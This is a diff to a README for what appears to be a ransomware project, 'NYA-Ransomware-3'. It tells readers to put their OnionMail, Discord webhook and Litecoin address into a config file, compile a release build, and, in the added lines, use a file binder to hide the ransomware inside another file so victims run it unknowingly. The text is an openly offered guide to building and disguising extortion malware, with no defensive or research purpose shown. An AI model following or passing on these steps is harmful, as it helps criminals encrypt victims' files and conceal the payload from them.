@@ -1,6 +1,3 @@
-# ISSUE FOUND
-I have found an issue why its crashing and i will resolve it soon!
-
 # NYA-Ransomware-3
 Nya Ransomware Easly Made!
 
@@ -14,6 +11,9 @@ Download Src<br />
 Go into Config.cs<br />
 Input ur OnionMail + Discord Webhook and ur LTC address the rest is just goofy and random stuff<br />
 Set The Arch to Release instead of debug and Compile Have Fun :3<br />
+Now Use a File Binder i Recommend Armdot but this one shall also work https://github.com/rohan-patra/File-Binder-Pro <br />
+Make Sure to Set the Path that it extracts to The "Current Path" or smth To make it Work!
+
 ## Features
 
 - Max 3 Password Tries
